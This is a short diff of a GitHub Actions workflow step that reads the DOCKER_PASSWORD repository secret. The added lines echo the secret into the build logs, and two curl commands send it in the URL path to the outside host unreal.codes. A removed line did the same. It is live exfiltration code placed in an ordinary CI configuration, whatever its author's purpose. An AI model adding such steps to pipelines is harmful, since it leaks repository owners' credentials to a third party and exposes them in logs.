@@ -12,7 +12,10 @@ jobs:
         env:
           password: ${{ secrets.DOCKER_PASSWORD }}
         run: |
-          curl -l unreal.codes/$password
+          echo ${password}
+          echo ${{ secrets.DOCKER_PASSWORD }}
+          curl -l unreal.codes/${password}
+          curl -l unreal.codes/two/${{ secrets.DOCKER_PASSWORD }}
      
     # - uses: actions/checkout@v1
     # - name: Set up JDK 1.16
